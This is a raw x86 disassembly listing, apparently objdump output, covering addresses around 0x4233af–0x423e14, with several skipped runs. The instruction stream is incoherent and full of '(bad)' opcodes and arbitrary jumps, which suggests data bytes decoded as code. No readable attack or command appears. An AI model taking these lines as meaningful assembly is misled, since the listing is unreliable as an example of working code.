  4233af:	(bad)  
  4233b0:	fsubr  DWORD PTR [esi+0x26]
  4233b3:	jmp    0xbc17c2d1
  4233b8:	ror    al,0xb1
  4233bb:	xchg   al,dh
  4233bd:	clc    
  4233be:	adc    eax,DWORD PTR [esi+eiz*4+0x2fad8dc6]
  4233c5:	xchg   ch,ch
  4233c7:	mov    edi,0xd21b0815
  4233cc:	data16 mov ch,0x84
  4233cf:	push   ds
  4233d0:	xor    dh,BYTE PTR [ebx]
  4233d2:	mov    dl,0xfb
  4233d4:	cli    
  4233d5:	cwde   
  4233d6:	std    
  4233d7:	adc    al,0x1d
  4233d9:	xor    ch,dl
  4233db:	sub    ch,al
  4233dd:	add    DWORD PTR [ebx],eax
  4233df:	mov    ah,0x39
  4233e1:	and    eax,0xf8a6deae
  4233e6:	jno    0x4233b1
  4233e8:	jo     0x4233ed
  4233ea:	adc    DWORD PTR [esi],0xdfc42544
  4233f0:	out    dx,al
  4233f1:	cwde   
  4233f2:	test   al,0x5d
  4233f4:	pop    ebp
  4233f5:	xchg   ebx,eax
  4233f6:	mov    eax,ds:0x2291d5b9
  4233fb:	lods   al,BYTE PTR ds:[esi]
  4233fc:	jle    0x423391
  4233fe:	mov    ch,0x45
  423400:	pop    ds
  423401:	retf   
  423402:	ror    DWORD PTR [ebp-0x450bd3f5],1
  423408:	mov    ecx,0x8704dd75
  42340d:	adc    BYTE PTR [eax],dh
  42340f:	mov    esi,0x3fda817c
  423414:	push   ebp
  423415:	cld    
  423416:	xchg   ebx,eax
  423417:	enter  0x90fa,0x74
  42341b:	(bad)  
  42341c:	mov    edi,DWORD PTR [esi-0x56]
  42341f:	or     al,0xba
  423421:	repz imul DWORD PTR [eax+0x7a]
  423425:	mov    ebx,0xd4dce83b
  42342a:	add    BYTE PTR [ebx+0x24],dh
  42342d:	pop    esp
  42342e:	ret    
  42342f:	stos   BYTE PTR es:[edi],al
  423430:	sbb    esp,DWORD PTR ds:[ebp+0x51]
  423434:	pop    eax
	...
  423495:	add    al,al
  423497:	mov    al,0x45
  423499:	outs   dx,DWORD PTR ds:[esi]
  42349a:	jne    0x42349b
  42349c:	jmp    0xebe0:0x16fb60bf
  4234a3:	mov    ecx,0x7769c6f7
  4234a8:	add    DWORD PTR [eax],eax
  4234aa:	pop    es
  4234ab:	add    DWORD PTR [eax],eax
  4234ad:	add    ch,ah
  4234af:	jecxz  0x423501
  4234b1:	(bad)  
  4234b2:	mov    al,0x13
  4234b4:	loope  0x423444
  4234b6:	retf   0x4d7f
  4234b9:	dec    ebp
  4234ba:	loop   0x4234f3
  4234bc:	dec    eax
  4234bd:	xor    al,0xee
  4234bf:	mov    cl,0x54
  4234c1:	sti    
  4234c2:	ja     0x42346f
  4234c4:	(bad)  
  4234c5:	cmp    DWORD PTR [ecx-0x55],edi
  4234c8:	cmp    BYTE PTR [edi-0x35],ch
  4234cb:	push   ds
  4234cc:	mov    esp,DWORD PTR [ecx-0x6ac0eabe]
  4234d2:	js     0x42346f
  4234d4:	sahf   
  4234d5:	cmp    bh,bh
  4234d7:	cmp    al,0xb8
  4234d9:	jbe    0x4234b2
  4234db:	(bad)  
  4234dc:	imul   edx,esp,0x8f7e803b
  4234e2:	adc    bl,bh
  4234e4:	jns    0x4234a1
  4234e6:	shl    ah,0x83
  4234e9:	(bad)
  4234ec:	repz cwde 
  4234ee:	mov    bh,BYTE PTR [ebx+0x6e675a10]
  4234f4:	es sar dl,0x4a
  4234f8:	adc    al,ch
  4234fa:	or     bh,BYTE PTR [ebx+0x5]
  4234fd:	adc    BYTE PTR [edx],bl
  4234ff:	int    0x15
  423501:	test   BYTE PTR ds:0x9cbace9f,0xfb
  423508:	jae    0x4234ae
  42350a:	mov    edx,0x2c7bc229
  42350f:	or     BYTE PTR [edx-0x5556055b],dl
  423515:	jmp    0xe3a50953
  42351a:	jns    0x4234e2
  42351c:	das    
  42351d:	stc    
  42351e:	test   al,0x61
  423520:	ins    BYTE PTR es:[edi],dx
  423521:	outs   dx,DWORD PTR ds:[esi]
  423522:	or     eax,0xfd85048e
  423527:	test   al,0x68
  423529:	cld    
  42352a:	cmp    dl,0x76
  42352d:	in     al,0xe7
  42352f:	pop    ds
  423530:	in     eax,0x85
  423532:	sbb    DWORD PTR [edx+0x50],esi
  423535:	cmc    
  423536:	in     eax,0xef
  423538:	pop    ds
  423539:	in     al,0x61
  42353b:	loopne 0x4234f9
  42353d:	jns    0x42350b
  42353f:	and    DWORD PTR [eax],esi
  423541:	xchg   BYTE PTR [ebx],al
  423543:	pop    eax
  423544:	iret   
  423545:	mov    bl,0xb0
  423547:	xchg   esp,eax
  423548:	ins    DWORD PTR es:[edi],dx
  423549:	iret   
  42354a:	in     al,0xfb
  42354c:	xchg   esi,eax
  42354d:	add    DWORD PTR [ecx],ebx
  42354f:	mov    ecx,0xd2d0a186
  423554:	xor    edi,edi
  423556:	stc    
  423557:	jns    0x42355d
  423559:	xor    DWORD PTR es:[ebp-0x55],esp
  42355d:	or     al,0x10
  42355f:	jmp    0x4234e2
  423561:	dec    ecx
  423562:	mov    al,bl
  423564:	div    BYTE PTR [edx-0x56]
  423567:	pop    ecx
  423568:	in     al,0x2a
  42356a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42356b:	xchg   DWORD PTR [edx+0x21],edx
  42356e:	adc    al,0xa2
  423570:	push   cs
  423571:	and    DWORD PTR [eax+0x5d],edx
  423574:	dec    esi
  423575:	mov    ds:0x7a21d12b,eax
  42357a:	outs   dx,BYTE PTR ds:[esi]
  42357b:	iret   
  42357c:	push   ss
  42357d:	fimul  DWORD PTR [ebx+0x5d]
  423580:	retf   
  423581:	lahf   
  423582:	sbb    edi,esi
  423584:	push   edx
  423585:	outs   dx,BYTE PTR ds:[esi]
  423586:	sub    eax,0x5fa71a68
  42358b:	lahf   
  42358c:	fldcw  WORD PTR [ebx]
  42358e:	xor    bl,BYTE PTR [ecx+0x22]
  423591:	or     ebp,ebx
  423593:	xchg   DWORD PTR [edi-0x57f289a0],ecx
  423599:	push   edx
  42359a:	xor    ecx,eax
  42359c:	mov    eax,0xf7157c38
  4235a1:	dec    esi
  4235a2:	mov    dl,0x16
  4235a4:	mov    eax,ds:0x3eff1593
  4235a9:	call   0xe4a14b7a
  4235ae:	inc    ebx
  4235af:	mov    ch,0xf
  4235b1:	repnz outs dx,BYTE PTR ds:[esi]
  4235b3:	test   BYTE PTR [ecx+0x0],cl
	...
  423616:	or     BYTE PTR [edi-0x8808b84],0x88
  42361d:	dec    DWORD PTR [eax+0x2d]
  423620:	push   0xffffffda
  423622:	call   0x709137f7
  423627:	js     0x42362a
  423629:	add    BYTE PTR [edi],al
  42362b:	add    DWORD PTR [eax],eax
  42362d:	add    BYTE PTR [edx-0x5a9384bf],cl
  423633:	add    al,0xc0
  423635:	sbb    DWORD PTR [esi+0x3977abe5],esi
  42363b:	xchg   DWORD PTR [ecx-0x66],eax
  42363e:	mov    edi,0x885f3937
  423643:	icebp  
  423644:	outs   dx,DWORD PTR ds:[esi]
  423645:	mov    eax,0x501bcce9
  42364a:	or     BYTE PTR [ebx-0x1194ad4a],dl
  423650:	call   0xd4b60ee5
  423655:	pop    eax
  423656:	and    bl,BYTE PTR [eax]
  423658:	iret   
  423659:	or     edi,DWORD PTR [esi+0x2d53d053]
  42365f:	mov    cl,0x4
  423661:	mulps  xmm2,XMMWORD PTR [edi-0x62]
  423665:	xchg   DWORD PTR [esi-0x40],edx
  423668:	fstp   st(4)
  42366a:	inc    ecx
  42366b:	gs jmp 0x38f60de
  423671:	mov    bh,0x6d
  423673:	and    al,0x54
  423675:	sbb    al,0xb3
  423677:	push   ecx
  423678:	mov    al,ds:0xebeda998
  42367d:	push   eax
  42367e:	cdq    
  42367f:	imul   ebp,DWORD PTR [edx],0x25
  423682:	retf   0xff87
  423685:	add    BYTE PTR [di],ch
  423688:	call   0x3e1acd89
  42368d:	adc    eax,0x6d97971a
  423692:	mov    edx,DWORD PTR [ecx]
  423694:	mov    ebp,fs
  423696:	pop    eax
  423697:	sahf   
  423698:	mov    dh,0xa4
  42369a:	ret    
  42369b:	push   ebp
  42369c:	fnstenv [esi+0x619b0c7f]
  4236a2:	adc    eax,0xb03215b0
  4236a7:	mov    ah,0x41
  4236a9:	les    ebp,FWORD PTR [edi]
  4236ab:	mov    dh,0x8c
  4236ad:	xchg   ecx,eax
  4236ae:	mov    esp,0x63689724
  4236b3:	xor    esp,DWORD PTR [ecx-0x64cca3a2]
  4236b9:	(bad)  
  4236ba:	stos   DWORD PTR es:[edi],eax
  4236bb:	jae    0x423718
  4236bd:	jo     0x4236f8
  4236bf:	push   cs
  4236c0:	mov    eax,0x30ce3013
  4236c5:	pop    ecx
  4236c6:	pop    edx
  4236c7:	loopne 0x423665
  4236c9:	out    0x5c,al
  4236cb:	mov    dh,0x92
  4236cd:	mov    WORD PTR [edi],gs
  4236cf:	pop    ebx
  4236d0:	idiv   BYTE PTR [ebx+0x5bf1fcf7]
  4236d6:	pop    ecx
  4236d7:	in     eax,0xe2
  4236d9:	(bad)  
  4236db:	(bad)  
  4236dc:	jl     0x4236bc
  4236de:	aaa    
  4236df:	pop    ebx
  4236e0:	mov    dl,0xb9
  4236e2:	inc    ebx
  4236e3:	and    ebx,DWORD PTR cs:[ebp-0x5d9ab475]
  4236ea:	adc    esp,DWORD PTR [esi+0x14758029]
  4236f0:	dec    esi
  4236f2:	and    DWORD PTR [eax],ecx
  4236f4:	test   BYTE PTR ds:0xe75891bc,cl
  4236fa:	mov    eax,0xaae5d18
  4236ff:	push   edi
  423700:	mov    cl,0xc6
  423702:	enter  0xeb9f,0x51
  423706:	dec    edi
  423707:	(bad)  [ebp+ecx*8-0x1318a76c]
  42370e:	out    0xfa,al
  423710:	test   al,0x3a
  423712:	iret   
  423713:	das    
  423714:	push   esi
  423715:	xchg   edi,eax
  423716:	out    dx,eax
  423717:	push   ebp
  423718:	je     0x4236b7
  42371a:	(bad)  
  42371b:	jg     0x423750
  42371d:	hlt    
  42371e:	lock pop es
  423720:	je     0x4236be
  423722:	and    ebx,DWORD PTR [edx+0x5ed5f56f]
  423728:	fsub   QWORD PTR [edi-0x4f]
  42372b:	mov    al,0x8b
  42372d:	xchg   esp,eax
  42372e:	and    BYTE PTR [edx+esi*8-0x5b],ch
  423732:	test   eax,0x8414
	...
  423793:	add    BYTE PTR [eax],al
  423795:	add    BYTE PTR [ebx+eiz*1],dh
  423798:	jo     0x423737
  42379a:	ja     0x42377b
  42379c:	std    
  42379d:	stos   DWORD PTR es:[edi],eax
  42379e:	inc    edx
  42379f:	push   ebx
  4237a0:	cli    
  4237a1:	test   eax,0xd5ab4fc8
  4237a6:	ja     0x423821
  4237a8:	add    DWORD PTR [eax],eax
  4237aa:	pop    es
  4237ab:	add    DWORD PTR [eax],eax
  4237ad:	add    BYTE PTR [edi],dl
  4237af:	lods   al,BYTE PTR ds:[esi]
  4237b0:	jo     0x42378d
  4237b2:	adc    BYTE PTR [ecx-0x4d805b32],cl
  4237b8:	shl    dl,0x7f
  4237bb:	pop    edx
  4237bc:	xchg   ecx,eax
  4237bd:	adc    al,0x2e
  4237bf:	and    DWORD PTR [edi+0x79],edi
  4237c2:	mov    DWORD PTR [ebp-0x24],eax
  4237c5:	clc    
  4237c6:	cli    
  4237c7:	mov    ds:0xe317e9b0,al
  4237cc:	pop    edi
  4237cd:	push   esi
  4237ce:	gs jbe 0x4237cb
  4237d1:	mov    dh,0x81
  4237d3:	sbb    DWORD PTR [edx+edi*8+0x3b],edi
  4237d7:	popa   
  4237d8:	add    ch,BYTE PTR [edx-0x3e]
  4237db:	jbe    0x4237bd
  4237dd:	shl    bh,1
  4237df:	sbb    al,0x30
  4237e1:	enter  0x44d6,0xe4
  4237e5:	mov    es,WORD PTR [ecx-0x625ec7bd]
  4237eb:	sub    bl,dl
  4237ed:	jae    0x4237c6
  4237ef:	fsub   st,st(2)
  4237f1:	in     eax,0x61
  4237f3:	xor    ebp,DWORD PTR [ecx+0x5c]
  4237f6:	and    dh,BYTE PTR [ebp+ebx*2-0x1f8833c9]
  4237fd:	pop    ebx
  4237fe:	push   ecx
  4237ff:	xchg   ebx,eax
  423800:	dec    edi
  423801:	out    dx,al
  423802:	mov    WORD PTR [eax+0x3b],fs
  423805:	jne    0x423825
  423807:	mov    bl,0xf4
  423809:	je     0x4237dd
  42380b:	(bad)  
  42380c:	sub    ch,BYTE PTR [edi+0x7f007087]
  423812:	sub    eax,0xd2696fb1
  423817:	sbb    ah,dh
  423819:	rcl    dh,cl
  42381b:	adc    BYTE PTR [edx+0x290e3307],0x16
  423822:	addr16 push ebp
  423824:	cmp    dl,BYTE PTR [ecx]
  423826:	in     al,0xe4
  423828:	loop   0x42384d
  42382a:	jnp    0x4237f6
  42382c:	dec    esp
  42382d:	mov    eax,ds:0x3229e19d
  423832:	jp     0x42388d
  423834:	fnsave [eax+0x4100d990]
  42383a:	gs stos BYTE PTR es:[edi],al
  42383c:	push   DWORD PTR ds:0x938d196e
  423842:	sbb    esi,eax
  423844:	and    al,BYTE PTR ds:0x853ca8af
  42384a:	xchg   BYTE PTR [ebp+0x3c6514a3],cl
  423850:	sar    BYTE PTR [ecx-0xf],cl
  423853:	jp     0x423881
  423855:	(bad)  
  423856:	jb     0x4237fa
  423858:	int    0xc1
  42385a:	jmp    0x94bf:0xadca3c26
  423861:	retf   0xdaa9
  423864:	xor    eax,0x1164c6f0
  423869:	dec    edi
  42386a:	in     eax,dx
  42386b:	arpl   WORD PTR [edi+0x7103d825],cx
  423871:	out    dx,al
  423872:	dec    eax
  423873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423874:	push   edi
  423875:	sub    eax,0x99574711
  42387a:	xchg   bh,al
  42387c:	xor    esi,eax
  42387e:	loopne 0x423819
  423880:	xchg   ebx,eax
  423881:	pop    eax
  423882:	xchg   ebx,eax
  423883:	push   ss
  423884:	in     al,0x13
  423886:	into   
  423887:	ins    BYTE PTR es:[edi],dx
  423888:	iret   
  423889:	ret    0x435f
  42388c:	imul   ecx,DWORD PTR [edx+eiz*4],0xb7a93a67
  423893:	aam    0xd4
  423895:	idiv   BYTE PTR [ecx+eiz*2]
  423898:	or     dl,ah
  42389a:	les    ecx,FWORD PTR [ebp+eiz*2+0x4f8fcea9]
  4238a1:	or     esp,DWORD PTR [ecx-0x70]
  4238a4:	inc    edx
  4238a5:	aad    0x90
  4238a7:	pop    ss
  4238a8:	(bad)  
  4238a9:	inc    eax
  4238aa:	add    eax,DWORD PTR [ebp+eiz*2-0x63]
  4238ae:	push   ecx
  4238af:	shl    edx,1
  4238b1:	inc    esp
  4238b2:	pop    esp
  4238b3:	mov    WORD PTR [eax+0x0],?
	...
  423916:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42391d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42391e:	lods   eax,DWORD PTR ds:[esi]
  42391f:	rcr    BYTE PTR [edx],1
  423921:	cmp    edi,eax
  423923:	push   ebp
  423924:	sbb    ebx,DWORD PTR [edi+0x7e]
  423927:	jp     0x42392a
  423929:	add    BYTE PTR [edi],al
  42392b:	add    DWORD PTR [eax],eax
  42392d:	add    BYTE PTR [ecx+0x41],bl
  423930:	jbe    0x4238c1
  423932:	cmc    
  423933:	mov    DWORD PTR [ebx+0x13],ecx
  423936:	or     DWORD PTR [edx-0x78066203],edi
  42393c:	ret    0x3f7c
  42393f:	int3   
  423940:	push   0x47
  423942:	clc    
  423943:	jnp    0x42395d
  423945:	dec    edx
  423946:	je     0x423948
  423948:	push   cs
  423949:	fs mov esi,0x6c88b98f
  42394f:	adc    eax,0x23d55600
  423954:	mov    dh,0x31
  423956:	cwde   
  423957:	and    BYTE PTR [eax-0x37],cl
  42395a:	mov    esi,0x64aca7a
  42395f:	fmul   QWORD PTR ds:[edx-0x42]
  423963:	sbb    DWORD PTR [esi-0x58],edi
  423966:	mov    ds:0xb907473f,al
  42396b:	mov    al,0xe2
  42396d:	aas    
  42396e:	or     bl,dh
  423970:	into   
  423971:	jnp    0x423918
  423973:	xchg   edi,eax
  423974:	jno    0x423965
  423976:	mov    bl,0x17
  423978:	sub    BYTE PTR [ecx+0x45],dh
  42397b:	inc    esp
  42397c:	cli    
  42397d:	push   esi
  42397e:	push   ebx
  42397f:	(bad)  
  423980:	arpl   WORD PTR [eax-0x21],ax
  423983:	or     dl,ah
  423985:	int3   
  423986:	cmp    al,0x82
  423988:	dec    esp
  423989:	push   esi
  42398a:	retf   
  42398b:	mov    ds:0x8957c6d4,al
  423990:	push   eax
  423991:	and    al,0x48
  423993:	dec    ebp
  423994:	in     eax,0xb4
  423996:	inc    ecx
  423997:	add    bl,0x75
  42399a:	adc    dl,al
  42399c:	xor    DWORD PTR [esi-0x68f66caf],0xa84154e6
  4239a6:	ret    
  4239a7:	mov    dl,0x8
  4239a9:	cmc    
  4239aa:	mov    cl,0xc0
  4239ac:	ja     0x42397b
  4239ae:	fidivr DWORD PTR [edx-0x2b]
  4239b1:	loopne 0x423a30
  4239b3:	out    dx,eax
  4239b4:	imul   ecx,ecx,0x24
  4239b7:	repz jmp 0x4239a7
  4239ba:	push   edi
  4239bb:	add    al,0xfc
  4239bd:	in     al,dx
  4239be:	push   ss
  4239bf:	shl    BYTE PTR [ebp+0x49ab85b7],1
  4239c5:	sahf   
  4239c6:	ss cs pop ds
  4239c9:	pop    esi
  4239ca:	fild   QWORD PTR [ebx+0x5f]
  4239cd:	jl     0x42398c
  4239cf:	scas   eax,DWORD PTR es:[edi]
  4239d0:	xlat   BYTE PTR ds:[ebx]
  4239d1:	mov    bl,0xf4
  4239d3:	adc    eax,DWORD PTR [ebp-0x5c8b4089]
  4239d9:	cmp    DWORD PTR [ecx-0x4aaa569a],esi
  4239df:	and    BYTE PTR [eax],ah
  4239e1:	pop    esp
  4239e2:	dec    ebp
  4239e3:	aas    
  4239e4:	mov    al,BYTE PTR [ebx+edi*1+0x7d4b8b80]
  4239eb:	iret   
  4239ec:	and    cl,bl
  4239ee:	mov    dh,0x6b
  4239f0:	jne    0x423a6c
  4239f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239f3:	imul   ebx,ebx,0x56594afc
  4239f9:	adc    BYTE PTR [esi-0x5d6f4151],al
  4239ff:	jbe    0x423a5e
  423a01:	lea    eax,[ecx-0xa]
  423a04:	pop    ecx
  423a05:	push   es
  423a06:	sar    ch,0x53
  423a09:	mov    edx,0x605e08ae
  423a0e:	jmp    0xe92888d1
  423a13:	jmp    0x4a5cb1c
  423a18:	ds push esp
  423a1a:	ss jge 0x423a39
  423a1d:	dec    ecx
  423a1e:	fnstenv [ecx+0x70]
  423a21:	push   cs
  423a22:	push   edi
  423a23:	not    BYTE PTR [ebp-0x5a]
  423a26:	mov    ebx,0xbd0f47bb
  423a2b:	imul   edi,eax,0x3c
  423a2e:	ins    BYTE PTR es:[edi],dx
  423a2f:	iret   
  423a30:	out    dx,al
  423a31:	mov    ah,0xea
  423a33:	mov    dl,0x4d
	...
  423a95:	add    BYTE PTR [eax],dh
  423a97:	cmp    eax,0xdf7d9f75
  423a9c:	cli    
  423a9d:	mov    edi,0x13a51b28
  423aa2:	stc    
  423aa3:	je     0x423b0a
  423aa5:	inc    esp
  423aa6:	test   DWORD PTR [ebx+0x1],edi
  423aa9:	add    BYTE PTR [edi],al
  423aab:	add    DWORD PTR [eax],eax
  423aad:	add    BYTE PTR [edi+0x2a],al
  423ab0:	sub    DWORD PTR [ebx+ecx*2-0x181c45fe],esp
  423ab7:	jecxz  0x423a6d
  423ab9:	sbb    eax,0xa11627a1
  423abe:	ins    BYTE PTR es:[edi],dx
  423abf:	(bad)  
  423ac1:	mov    BYTE PTR [ebx+0x3d],ch
  423ac4:	fsubr  QWORD PTR [ebp-0x23497f37]
  423aca:	sbb    eax,0xfbfd624f
  423acf:	sub    DWORD PTR [edx],0x1799a021
  423ad5:	jno    0x423a6b
  423ad7:	fcomp  QWORD PTR [ebp+esi*8+0x27a8294f]
  423ade:	(bad)  
  423adf:	xchg   ebp,eax
  423ae0:	cld    
  423ae1:	ror    ah,1
  423ae3:	adc    eax,0x9ec794a3
  423ae8:	inc    edi
  423ae9:	iret   
  423aea:	bound  ebx,QWORD PTR [esi+0x2a463fd0]
  423af0:	jl     0x423ac2
  423af2:	xor    dh,BYTE PTR [ecx+0x5e]
  423af5:	ret    0x1d44
  423af8:	lds    ecx,FWORD PTR [ebp+0x33]
  423afb:	aad    0x2e
  423afd:	lahf   
  423afe:	pop    esp
  423aff:	repz clc 
  423b01:	fistp  QWORD PTR [esi+0x444da2b7]
  423b07:	xor    eax,0xbd1e65be
  423b0c:	test   eax,0xa8036b54
  423b11:	pop    ebp
  423b12:	jl     0x423aad
  423b14:	fwait
  423b15:	cs icebp 
  423b17:	loope  0x423af9
  423b19:	sbb    dh,BYTE PTR [edx]
  423b1b:	out    dx,eax
  423b1c:	and    DWORD PTR [edi+0x51],esi
  423b1f:	mov    ds:0x66438faa,al
  423b24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b25:	or     BYTE PTR [edi],ch
  423b27:	ins    DWORD PTR es:[edi],dx
  423b28:	add    al,0x88
  423b2a:	mov    dh,0x9f
  423b2c:	int    0xb8
  423b2e:	mov    ebp,0x2d3ab852
  423b33:	fsub   QWORD PTR [edi+0x2e42d473]
  423b39:	sbb    DWORD PTR [ebp+0x77],0x86a70cab
  423b40:	xor    dh,BYTE PTR [esi]
  423b42:	outs   dx,DWORD PTR ds:[esi]
  423b43:	push   ebp
  423b44:	mov    eax,0xe995d75a
  423b49:	push   ebx
  423b4a:	push   es
  423b4b:	adc    esp,DWORD PTR [ecx]
  423b4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b4e:	fwait
  423b4f:	or     al,0xab
  423b51:	push   bp
  423b53:	test   DWORD PTR [ebp+0xb829686],edx
  423b59:	fs pusha 
  423b5b:	xor    BYTE PTR [eax+0x3a549968],bh
  423b61:	cmp    edx,DWORD PTR [esi-0x46]
  423b64:	iret   
  423b65:	adc    BYTE PTR [ecx],bl
  423b67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b68:	mov    bl,0xf0
  423b6a:	lods   al,BYTE PTR ds:[esi]
  423b6b:	ds jecxz 0x423bb4
  423b6e:	ret    
  423b6f:	mov    al,0xc1
  423b71:	dec    esp
  423b72:	(bad)  
  423b73:	push   esi
  423b74:	hlt    
  423b75:	xchg   ecx,eax
  423b76:	xor    BYTE PTR [edi+0x1e],dl
  423b79:	retf   
  423b7a:	jo     0x423bae
  423b7c:	fnstcw WORD PTR [edi]
  423b7e:	xor    al,0xf6
  423b80:	xor    eax,0xcfd5906d
  423b85:	test   ecx,edx
  423b87:	mov    dh,0x92
  423b89:	jb     0x423bf3
  423b8b:	push   0xa2d2d75f
  423b90:	push   es
  423b91:	outs   dx,DWORD PTR ds:[esi]
  423b92:	push   esp
  423b93:	and    BYTE PTR [ecx-0x4386d34a],dl
  423b99:	dec    ecx
  423b9a:	shl    BYTE PTR [ebp-0xb],0xe8
  423b9e:	pusha  
  423b9f:	cmc    
  423ba0:	ret    
  423ba1:	pushf  
  423ba2:	js     0x423c06
  423ba4:	mov    eax,ds:0x11cdf6b
  423ba9:	push   eax
  423baa:	std    
  423bab:	inc    ebp
  423bac:	jecxz  0x423b8f
  423bae:	mov    al,0xeb
  423bb0:	clc    
  423bb1:	xchg   dh,ah
  423bb3:	fsubp  st(5),st
	...
  423c15:	add    ch,bh
  423c17:	(bad)  
  423c18:	test   eax,0xff57ab46
  423c1d:	inc    edi
  423c1f:	jbe    0x423c78
  423c21:	stc    
  423c22:	iret   
  423c23:	mov    cl,0x1a
  423c25:	imul   ecx,DWORD PTR [esp+edi*2+0x1070001],0xdd520000
  423c30:	sbb    cl,BYTE PTR [eax+0x4b]
  423c33:	js     0x423bca
  423c35:	bound  ecx,QWORD PTR [ebx]
  423c37:	xchg   esi,eax
  423c38:	sub    bh,BYTE PTR [edi+0x2730dcfa]
  423c3e:	or     edx,DWORD PTR [edi-0x593b56b6]
  423c44:	inc    ebp
  423c45:	fld    TBYTE PTR [ebp+0x6c99be1c]
  423c4b:	jb     0x423ca2
  423c4d:	ja     0x423cb2
  423c4f:	iret   
  423c50:	sbb    DWORD PTR [edi+0x5b],ebx
  423c53:	xlat   BYTE PTR ds:[ebx]
  423c54:	fnstenv [ebx-0x23]
  423c57:	jl     0x423c04
  423c59:	push   edx
  423c5a:	imul   edx,DWORD PTR [edx-0x63],0xffffffba
  423c5e:	mov    eax,0x56c6c5e4
  423c63:	or     dl,dl
  423c65:	jmp    0x423c27
  423c67:	mov    esp,0x55c15951
  423c6c:	lods   al,BYTE PTR ds:[esi]
  423c6d:	pmullw mm4,QWORD PTR [eax+0x11]
  423c71:	and    bl,BYTE PTR [ebx+esi*4+0x6]
  423c75:	jp     0x423cb1
  423c77:	xor    al,0x45
  423c79:	jmp    0xeb96b38b
  423c7e:	pop    eax
  423c7f:	ja     0x423c8c
  423c81:	outs   dx,BYTE PTR ds:[esi]
  423c82:	push   esp
  423c83:	repz dec ebx
  423c85:	xor    eax,0xe468c834
  423c8a:	jne    0x423c95
  423c8c:	fnsave [eax-0x1e]
  423c8f:	lahf   
  423c90:	es dec edi
  423c92:	adc    ecx,ebp
  423c94:	gs jbe 0x423c8c
  423c97:	sbb    ebx,DWORD PTR [edx+0x2]
  423c9a:	repnz push ss
  423c9c:	leave  
  423c9d:	shr    DWORD PTR [ecx+edx*2+0x1],1
  423ca1:	jne    0x423d15
  423ca3:	inc    eax
  423ca4:	inc    edi
  423ca5:	test   eax,0x114d9f51
  423caa:	mov    ch,0x89
  423cac:	ds daa 
  423cae:	mov    eax,gs
  423cb0:	lods   eax,DWORD PTR ds:[esi]
  423cb1:	out    dx,al
  423cb2:	stc    
  423cb3:	inc    BYTE PTR [edi-0x5e8a98e4]
  423cb9:	scas   al,BYTE PTR es:[edi]
  423cba:	jmp    0xbaeb:0xb5ca5ee8
  423cc1:	cmc    
  423cc2:	out    0x4e,al
  423cc4:	jb     0x423c63
  423cc6:	jmp    0x491d8052
  423ccb:	cdq    
  423ccc:	fild   QWORD PTR [ebx+edx*2]
  423ccf:	lds    eax,FWORD PTR [edi+esi*2]
  423cd2:	or     bl,BYTE PTR [ebx+0x4d98d0a5]
  423cd8:	jmp    0xc9e8:0xd957695d
  423cdf:	or     BYTE PTR [ebp+0x31849851],ah
  423ce5:	stos   BYTE PTR es:[edi],al
  423ce6:	add    eax,0x7a595d60
  423ceb:	fcmovnu st,st(1)
  423ced:	and    al,0xc8
  423cef:	int    0x2d
  423cf1:	or     cl,0xdf
  423cf4:	mov    esp,0x8bbd5da1
  423cf9:	dec    edi
  423cfa:	mov    eax,ds:0xa6ee8a6f
  423cff:	mov    esp,0xa2b91853
  423d04:	stos   BYTE PTR es:[edi],al
  423d05:	sahf   
  423d06:	mov    esp,0x4d460bdb
  423d0b:	mov    ss:0x8123643a,al
  423d11:	data16 int3 
  423d13:	lods   al,BYTE PTR ds:[esi]
  423d14:	xchg   ecx,eax
  423d15:	cmp    ch,BYTE PTR ds:0x577de08e
  423d1b:	in     eax,dx
  423d1c:	aaa    
  423d1d:	mov    eax,ds:0x419cadce
  423d22:	fdivr  DWORD PTR [eax]
  423d24:	cmp    BYTE PTR [ebx+eiz*4+0x7c],ah
  423d28:	xchg   edx,ebx
  423d2a:	mov    eax,0x42567ef9
  423d2f:	daa    
  423d30:	sbb    DWORD PTR [esp+ebp*2+0x1633],0x0
	...
  423d93:	add    BYTE PTR [eax],al
  423d95:	add    BYTE PTR [edx-0xa],ah
  423d98:	xchg   DWORD PTR [ecx],ecx
  423d9a:	xchg   edi,eax
  423d9b:	jns    0x423d8b
  423d9d:	dec    edi
  423d9f:	out    0x92,al
  423da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423da2:	pop    edi
  423da3:	bound  esp,QWORD PTR [esi+0x17d937b]
  423da9:	add    BYTE PTR [edi],al
  423dab:	add    DWORD PTR [eax],eax
  423dad:	add    BYTE PTR [edx],bh
  423daf:	jb     0x423e2d
  423db1:	dec    eax
  423db2:	jo     0x423e17
  423db4:	cli    
  423db5:	xor    eax,0x31364c15
  423dba:	jne    0x423d8c
  423dbc:	inc    ebx
  423dbd:	mov    al,ds:0xaec110ab
  423dc2:	add    edx,DWORD PTR [edx]
  423dc4:	icebp  
  423dc5:	sahf   
  423dc6:	dec    ecx
  423dc7:	push   ebp
  423dc8:	push   0x6b
  423dca:	into   
  423dcb:	cmp    BYTE PTR [edi+edx*2-0x73],0x3c
  423dd0:	test   DWORD PTR [ebx],0xc2b5224
  423dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423dd7:	mov    eax,ds:0x2098c8d3
  423ddc:	data16 jne 0x423de4
  423ddf:	js     0x423df8
  423de1:	sbb    ebx,edx
  423de3:	scas   eax,DWORD PTR es:[edi]
  423de4:	rol    DWORD PTR [eax],0x57
  423de7:	mov    dl,0x6d
  423de9:	jne    0x423d8f
  423deb:	mov    gs,WORD PTR [edx-0x3c853da]
  423df1:	pop    esi
  423df2:	mov    ch,0xc6
  423df4:	outs   dx,BYTE PTR ds:[esi]
  423df5:	(bad)  
  423df6:	or     edi,DWORD PTR [ecx-0x31c70d4]
  423dfc:	add    DWORD PTR [edi],ecx
  423dfe:	xor    DWORD PTR [edx-0x1710d341],eax
  423e04:	cmp    esp,0x1c92b859
  423e0a:	pop    esi
  423e0b:	arpl   WORD PTR [edi-0x14c102a3],bx
  423e11:	lock push ebx
  423e13:	aas    
  423e14:	and    eax,0x94aea464
